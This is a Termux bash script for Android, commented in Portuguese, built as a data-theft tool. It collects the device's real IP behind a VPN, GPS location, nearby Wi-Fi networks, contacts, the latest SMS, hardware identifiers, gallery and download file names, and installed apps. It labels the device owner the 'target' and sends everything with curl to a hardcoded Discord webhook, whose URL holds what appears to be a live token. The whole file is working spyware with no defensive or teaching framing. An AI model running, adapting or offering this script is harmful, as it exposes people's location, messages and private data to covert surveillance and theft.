#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Executando varredura absoluta... Aguarde."

# 1. TENTATIVA AGRESSIVA DE IP REAL (ANTI-VPN)
IP_VPN=$(curl -s --max-time 5 https://ifconfig.me)
# Pega o IP da interface Wi-Fi interna (geralmente o IP real na rede local)
IP_LOCAL_REAL=$(ip addr show wlan0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
# Tenta descobrir o gateway real para burlar a rota da VPN
GATEWAY_REAL=$(ip route show table main | grep default | grep -v tun | awk '{print $3}')

# 2. LOCALIZACAO E SENSORES (Requer Termux-API instalado)
# Tenta pegar GPS exato (latitude/longitude)
GPS=$(termux-location -p gps -s last 2>/dev/null)
# Lista redes WiFi ao redor (ajuda a triangular localizacao)
WIFIS=$(termux-wifi-scaninfo 2>/dev/null | grep "ssId" | head -n 5)

# 3. DADOS PRIVADOS (CONTATOS E SMS)
# So funciona se o usuario aceitou a permissao na tela
CONTATOS=$(termux-contact-list 2>/dev/null | head -n 10)
ULTIMO_SMS=$(termux-sms-list -l 1 2>/dev/null)

# 4. IDENTIDADE PROFUNDA
MODELO=$(getprop ro.product.model)
SERIAL=$(getprop ro.serialno)
ID_ANDROID=$(settings get secure android_id)
CONTAS=$(getprop ro.com.google.clientidbase)
OPERADORA=$(getprop gsm.operator.alpha)

# 5. ARQUIVOS E APPS
GALERIA=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 15)
DOWNLOADS=$(ls /sdcard/Download 2>/dev/null | head -n 15)
APPS=$(pm list packages -3 | cut -d: -f2 | head -n 20)

# 6. MONTAGEM DO PAYLOAD MONSTRO
PAYLOAD=$(cat <<EOF
{
  "content": "🚨 **RELATORIO DE EXTRACAO TOTAL ANDROID** 🚨",
  "embeds": [
    {
      "title": "Alvo: $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Conexao e IP Real", "value": "IP VPN: $IP_VPN\nIP Local Real: $IP_LOCAL_REAL\nGateway: $GATEWAY_REAL\nOperadora: $OPERADORA", "inline": false },
        { "name": "Localizacao (GPS/WiFi)", "value": "GPS: ${GPS:-Sem Sinal}\nWiFi Prox: ${WIFIS:-N/A}", "inline": false },
        { "name": "Identificadores", "value": "ID Android: $ID_ANDROID\nSerial: $SERIAL\nConta Base: $CONTAS", "inline": false },
        { "name": "Dados Privados", "value": "Contatos: ${CONTATOS:-Bloqueado}\nSMS: ${ULTIMO_SMS:-Bloqueado}", "inline": false },
        { "name": "Arquivos (Galeria/Downloads)", "value": "Galeria: ${GALERIA:-Acesso Negado}\nDownloads: ${DOWNLOADS:-Acesso Negado}", "inline": false },
        { "name": "Apps Instalados", "value": "${APPS:-N/A}", "inline": false }
      ]
    }
  ]
}
EOF
)

# ENVIO PARA O DISCORD
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL

echo "Varredura Completa Enviada."
